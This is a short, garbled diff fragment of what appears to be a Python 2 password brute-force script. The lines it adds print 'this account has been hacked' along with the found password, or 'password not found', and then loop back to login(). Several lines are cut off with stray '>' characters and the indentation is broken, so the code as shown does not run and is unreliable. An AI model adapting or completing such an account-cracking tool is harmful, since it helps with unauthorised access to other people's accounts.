@@ -34,3 +34,9 @@ def login():
          if error[14] == '<':
             system('clear')
             main()
+print '[+] this account has been hacked, password :' + pa>
+                                                                     >
+            break
+         else:
+            print '[!] password not found => ' + password
+login()
